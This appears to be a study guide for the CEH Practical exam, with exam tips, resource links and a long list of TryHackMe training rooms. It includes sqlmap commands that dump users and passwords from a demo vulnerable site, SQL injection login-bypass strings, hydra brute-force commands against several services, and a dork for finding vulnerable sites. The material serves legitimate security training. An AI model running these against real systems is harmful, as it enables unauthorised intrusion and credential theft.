# Study Walkthrough

If you have money, you can afford iLabs because the challenges are based on the iLab environment and you will get hands-on practice to clear this exam.

If you can’t afford iLab, there are many platforms in which you can practice the listed tools. I personally prefer TryHackMe and HackTheBox. This Exam is all about how much knowledge you have on tools.











### Commands were used during the exam <a href="#7129" id="7129"></a>

&#x20;

* **sqlmap-**

site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?= (for finding vulnerable site)

(for cookies- console->document.cookie)

&#x20;

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  --dbs   (databases)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart –tables   (tables)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users --columns   (columns)

(dump whole table)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users  --dump  &#x20;

&#x20;                                                           OR                                                                                   &#x20;

(dump individual  column data)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C uname  --dump &#x20;

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C pass  --dump

&#x20;

### My Initial way of approaching Exam/ Vuln CTF Boxes: <a href="#fed1" id="fed1"></a>

1. **netdiscover -i eth0** — This will help me to get the machines available on our network. \[ **eth0 may differ if VPN network I will be tun0** ]
2. Once I get the IP’s I will run my **Nmap** on all those IP’s.
3. **nmap -p- 10.10.10.10 \[ Any IP ]**

Once I ran the above command I will get all the opened port on that target and then with that open port, I will run another nmap, for example, if port 443,80,53,135,8080,8888 are opened then my nmap command will be.

4\. **nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10**

This will find out the OS version, service version, and ran default nmap script and store the output. Storing output is very important, you may need to refer it many times.

5\. While nmap is running I will open all the IPs on browser and will see whether any web service is running on not, if Yes then I will run gobuster or dirb.

**gobuster -e -u** [**http://10.10.10.10**](http://192.168.0.155/) **-w wordlsit.txt**

**dirb** [**http://**](http://192.168.1.224/)**10.10.10.10 wordlist.txt**

6\. If I find any login page I will try SQLi manually

```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```

7\. Brute Forcing services !! and making custom wordlists is always an added advantage but make sure the service won’t be down OR lock you out from trying again.

**Some of the default password list:**

* [http://www.phenoelit.org/dpl/dpl.html](http://www.phenoelit.org/dpl/dpl.html)
* [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)
* [https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)

**Making custom wordlist from website keywords:**

* **cewl** example.com -m 5 -w words.txt

where **cewl** is the tool, **example.com** is the site, **-m** is to specify the minimum length of the word , **-w** is to specify the output file

**Some of the service brute force with hydra:**

* hydra -l root -P passwords.txt \[-t 32] \<IP> _**ftp**_
* hydra -L usernames.txt -P pass.txt \<IP> _**mysql**_
* hydra -l USERNAME -P /path/to/passwords.txt -f \<IP> _**pop3**_ -V
* hydra -V -f -L \<userslist> -P \<passwlist> _**rdp**_://\<IP>
* hydra -P common-snmp-community-strings.txt target.com _**snmp**_
* hydra -l Administrator -P words.txt 192.168.1.12 _**smb**_ -t 1
* hydra -l root -P passwords.txt \<IP> _**ssh**_

**Searchsploit useful commands:**

* searchsploit “Linux Kernel”
* searchsploit -m 7618 — **Paste the exploit in the current directory**
* searchsploit -p 7618\[.c] — **Show complete path**
* searchsploit — nmap file.xml — **Search vulns inside a Nmap XML result**

### Some resource links will help you in the exam. <a href="#fa6c" id="fa6c"></a>

[https://github.com/cmuppin/CEH](https://github.com/cmuppin/CEH)\
[https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052](https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052)\
[https://github.com/Samsar4/Ethical-Hacking-Labs](https://github.com/Samsar4/Ethical-Hacking-Labs)\
[https://github.com/Rezkmike/CEH\_Practical\_Preparation](https://github.com/Rezkmike/CEH\_Practical\_Preparation)\
[https://www.youtube.com/watch?v=ycZFk-GT5-I](https://www.youtube.com/watch?v=ycZFk-GT5-I) (i-lab videos).

### Tips <a href="#91e1" id="91e1"></a>

_1) First finish linux based questions like nmap etc and save those in the desktop folder, believe me you will look into the nmap scans over and over again._\
_2) Watch the ilab videos from youtube and reffer CEH practical Lab manual._\
_3) Everything will be asked from the ilab videos nothing will be out of sylabus._\
_4) Be Cool._

The Username and Password file will be present in the parrot machine it will help you to crack the ftp and wordpress related questions.

Don’t be nervous, you are going to pass the exam with no doubt. Patience is really needed for the exam because the parrot machine is outdated and its very slow.



**Exam Experience:**

I know this is the most awaited part. The exam is watched over by a person called a proctor. They use GoToMeeting, a program that sees and hears you through your computer. They'll also record what's on your screen during the whole exam. After your identity is verified, your exam starts.

The exam is on a website called iLab. You don't need to worry about taking pictures of your virtual machines (VMs).

You'll get two Operating systems to test things on. One is Parrot OS, and the other is Windows 7. No more Kali this time.&#x20;

**You can DO** use the internet for the exam. You can look things up, take notes on your computer, watch videos, and read blogs. **But DON”T** write notes by hand, talk to people, or make calls.

Your exam computers won't have regular internet access. You need to use your web browser to access the internet.

* Start with the scanning part (NMAP Scan), since the scanning part takes some time, I moved on to other hacking questions.
* Scan all ports on IPs because default scripts might not catch smart configurations.



**Damn Vulnerable Web Application (DVWA)**

DVWA is a PHP/MYSQL vulnerable website that's made to be easy to hack. It's used to practice common web problems. It has different levels of difficulty. DVWA is important for the CEH (Practical) exam. It's a good idea to practice on DVWA because the exam might have similar challenges.

You can refer to the link [https://bughacking.com/dvwa-ultimate-guide-first-steps-and-walkthrough/](https://bughacking.com/dvwa-ultimate-guide-first-steps-and-walkthrough/) for a full guide on the setup and use of DVWA.

* **Hack The Box** (Challenges Steganography and Web) ([https://www.hackthebox.eu/](https://www.hackthebox.eu/))
* **Vulnhub** (Machines Easy to Medium) ([https://www.vulnhub.com/](https://www.vulnhub.com/))
* **TryHackMe (**[**https://tryhackme.com/**](https://tryhackme.com/)**)**&#x20;

### THM Materials

* Windows Fundamentals Module 🏠 [THM Room](https://tryhackme.com/module/windows-fundamentals)
* Linux Fundamentals Module 🏠 [THM Room](https://tryhackme.com/module/linux-fundamentals)
* Google Dorking 🏠 [THM Room](https://tryhackme.com/room/googledorking)
* OHsint 🏠 [THM Room](https://tryhackme.com/room/ohsint)
* BurpSuite: The Basics 🏠 [THM Room](https://tryhackme.com/room/burpsuitebasics)
* BurpSuite: Repeater 🏠 [THM Room](https://tryhackme.com/room/burpsuiterepeater)
* Hydra 🏠 [THM Room](https://tryhackme.com/room/hydra)
* Nmap 🏠 [THM Room](https://tryhackme.com/room/rpnmap)
* Nmap Live Host Discovery 🏠 [THM Room](https://tryhackme.com/room/nmap01)
* Crack The Hash 🏠 [THM Room](https://tryhackme.com/room/crackthehash)
* Sublist3r 🏠 [THM Room](https://tryhackme.com/room/rpsublist3r)
* Web Scanning 🏠 [THM Room](https://tryhackme.com/room/rpwebscanning)
* Metasploit: Introduction 🏠 [THM Room](https://tryhackme.com/room/metasploitintro)
* Metasploit 🏠 [THM Room ](https://tryhackme.com/room/metasploitintro)
* More Detailed Tutorial of Metasploit 🗒️ [NoobLinux Article](https://nooblinux.com/metasploit-tutorial/)
* SQL Injection 🏠 [THM Room](https://tryhackme.com/room/sqlilab)
* Nessus 🏠 [THM Room](https://tryhackme.com/room/rpnessusredux)
* WireShark The Basics 🏠 [THM Room](https://tryhackme.com/room/wiresharkthebasics)
* CCStego 🏠 [THM Room](https://tryhackme.com/room/ccstego)
* Tmux 🏠 [THM Room](https://tryhackme.com/room/rptmux)&#x20;
* TShark 🏠 [THM Room](https://tryhackme.com/room/tshark)
* Brooklyn Nine Nine 🚩 [THM CTF](https://tryhackme.com/room/brooklynninenine) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/brooklyn-nine-nine)
* Lianyu 🚩 [THM CTF ](https://tryhackme.com/room/lianyu)🟢 - My Writeup
* StartUp 🚩 [THM CTF](https://tryhackme.com/room/startup) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/startup)
* Ice  🚩 [THM CTF ](https://tryhackme.com/room/ice)🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/ice)
* DVWA 🏠 [THM Room](https://medium.com/techiepedia/certified-ethical-hacker-practical-exam-guide-dce1f4f216c9)
* Anthem 🏠 [THM Room](https://tryhackme.com/room/anthem)
* The Code Caper 🏠 [THM Room ](https://tryhackme.com/room/thecodcaper)
* Agent Sudo  🚩 [THM CTF](https://tryhackme.com/room/agentsudoctf) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/agent-sudo)
* Simple CTF 🚩 [THM CTF](https://tryhackme.com/room/easyctf) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/simple-ctf)
* AttackerKB 🚩 [THM CTF ](https://tryhackme.com/room/attackerkb)🟢 - My Writeup
* Blue  🚩 [THM CTF ](https://tryhackme.com/room/blue)🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/eternal-blue)
* Bounty Hacker  🚩 [THM CTF](https://tryhackme.com/room/vulnversity) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/bounty-hacker)
* Vulnversity  🚩 [THM CTF ](https://tryhackme.com/room/vulnversity)🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/vulnversity)
* Lazy Admin  🚩 [THM CTF](https://tryhackme.com/room/lazyadmin) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/lazyadmin)
* Juiceshop  🚩 [THM CTF](https://tryhackme.com/room/owaspjuiceshop) 🟢 - My Writeup
* Ignite  🚩 [THM CTF](https://tryhackme.com/room/ignite) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/ignite)
* Year of Rabbit 🚩 [THM CTF](https://tryhackme.com/room/yearoftherabbit) 🟢 - My Writeup
* Jack-of-All-Trades 🚩 [THM CTF](https://tryhackme.com/room/jackofalltrades) 🟢 - My Writeup&#x20;
* Kenobi 🚩 [THM CTF ](https://tryhackme.com/room/kenobi)🟢 - [My Writeup ](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/kenobi)
* Blaster 🚩 [THM CTF ](https://tryhackme.com/room/blaster)🟢 - My Writeup&#x20;
* Pickle Rick 🚩 [THM CTF](https://tryhackme.com/room/picklerick) 🟢 - [My Writeup ](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/pickle-rick)
* OWASP Top 10 🏠[ THM Room ](https://tryhackme.com/room/owasptop10)
* Develpy 🏠 [THM Room ](https://tryhackme.com/room/bsidesgtdevelpy)
* CC Radare2 🏠 [THM Room ](https://tryhackme.com/room/ccradare2)
* CC Steganography 🏠 [THM Room](https://tryhackme.com/room/ccstego)
* Windows Privesc Arena  🏠 [THM Room](https://tryhackme.com/room/windowsprivescarena)
* Linux Privesc Arena 🏠 [THM Room](https://tryhackme.com/room/linuxprivescarena)
* Windows Privesc 🏠 [THM Room](https://tryhackme.com/room/windows10privesc)
* Post Exploitation Basics 🏠 [THM Room](https://tryhackme.com/room/postexploit)
* The Code Caper 🏠 THM Room&#x20;
* Smag Grotto 🚩 [THM CTF](https://tryhackme.com/room/smaggrotto) 🟢 - [My Writeup ](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/smag-grotto)
* Dogcat 🚩 [THM CTF](https://tryhackme.com/room/dogcat) 🟢 - My Writeup&#x20;
* Break Out The Cage 🚩 [THM CTF](https://tryhackme.com/room/breakoutthecage1) 🟢 - My Writeup&#x20;
* Overpass 🚩 [THM CTF ](https://tryhackme.com/room/overpass)🟢 - [My Writeup  ](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/overpass)
* Carnage 🚩 [THM CTF](https://tryhackme.com/room/c2carnage) 🟠 - My Writeup
* Warzone 1 🚩 [THM CTF ](https://tryhackme.com/room/warzoneone)🟠 - My Writeup
* Misguided Ghost 🚩 [THM CTF ](https://tryhackme.com/room/misguidedghosts)🔴 - My Writeup

















